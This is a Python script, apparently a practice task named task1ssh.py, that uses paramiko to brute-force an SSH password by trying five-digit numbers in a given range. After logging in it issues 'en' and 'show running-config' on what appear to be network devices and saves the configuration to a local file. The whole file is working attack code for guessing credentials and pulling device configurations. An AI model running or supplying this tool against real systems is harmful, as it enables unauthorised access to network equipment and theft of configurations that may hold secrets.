#!/usr/bin/python3
import paramiko
import sys
import time
import argparse
#import logging
#logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)

#sys.stderr = open('/dev/null', 'w')

parser = argparse.ArgumentParser(description="usage - ./task1ssh.py --start <start number for iterate> "+\
 	"--finish <end number> <host> <username>\n"+\
	"or ./task1ssh.py --password <password> <host> <username>")
parser.add_argument("host", help="Host to connect")
parser.add_argument("username", help="ssh username")
parser.add_argument("--start", help="(optional) Start number for iterate")
parser.add_argument("--finish", help="(optional) End number for iterate")
parser.add_argument("--password", help="(optional) ssh password")
parser.add_argument("--verbose",type=int, default=0, help="(optional) verbose output - put a number greater than 0 ")

args = parser.parse_args()
host = args.host
username = args.username
start = args.start
finish = args.finish
password = args.password
verbose = args.verbose
if verbose > 0:
	import logging
	logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)

class Test_task(object):
	def __init__(self,host,username,start,finish,password):
		self.host=host
		self.username=username
		self.start=start #None
		self.finish=finish #None
		self.password=password #None
		self.connect_status = False
		self.shell = None
		self.config_string = None
		self.file_write_success = False

	def brute_call(self,host,username):
		start = int(self.start)
		finish = int(self.finish)
		print("Run password brute-force")
		while start <= finish:
			password = "{num:0>5}".format(num=start)
			print(f"Check {password}")
			self.ssh_connect(host,username,password)
			start += 1
			if self.connect_status == True:
				print (" PASSWORD :",password)
				break

	def ssh_connect(self,host,username,password):
		try:
			client = paramiko.SSHClient()
			client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			client.connect(hostname=host, username=username, password=str(password),
			look_for_keys=False, allow_agent=False)
			''' Successful connection after this line , else paramiko.ssh_exception.AuthenticationException '''
			self.connect_status = True
			self.shell = client.invoke_shell()
		except paramiko.ssh_exception.AuthenticationException:
			try:
				client.close()
				self.connect_status = False
			except paramiko.ssh_exception.BadAuthenticationType:
				self.connect_status = False

	def shell_job(self):
		if self.shell is not None:
			ssh = self.shell
			ssh.send("en\n")
			time.sleep(2)
			ssh.recv(1000)
			ssh.send("show running-config\n")
			time.sleep(2)
			config_bytes = ssh.recv(1000)
			config = config_bytes.decode("UTF-8")
			self.config_string = config
		else:
			print("Shell control failed, exit ")
			sys.exit(1)

	def file_write(self,string_config):
		if self.config_string is not None:
			try:
				config = string_config
				config_file = open("./example.conf","w")
				a = config_file.write(config)
				config_file.close()
				print("writed to file ./example.conf")
			except OSError:
				print("Could not open file for writing \n")
				sys.exit(1)
		else:
			print("Failed to get config file, exit ")
			sys.exit(1)
	def start_m(self):
		if self.password is not None and self.start is None and self.finish is None:
			print("password is specified, connection by password ")
			self.ssh_connect(self.host,self.username,self.password)
			if self.connect_status == True:
				self.shell_job()
				self.file_write(self.config_string)
				if self.file_write_success == True:
					print("Everything went well, exit")
					sys.exit(0)
			if self.connect_status == False:
				print("connection failed, exit ")
				sys.exit(1)
		elif self.start is not None and self.finish is not None and self.password is None:
			print("A range of numbers is specified, the password will be brute-force ")
			self.brute_call(self.host,self.username)
			if self.connect_status == True:
				self.shell_job()
				self.file_write(self.config_string)
				if self.file_write_success == True:
					print("Everything went well, exit")
					sys.exit(0)
		elif self.start is not None or self.finish is not None:
			print('Input data error, exit')
			sys.exit(1)
		else:
			print("error, exit")
			sys.exit(1)


task = Test_task(host,username,start,finish,password)
task.start_m()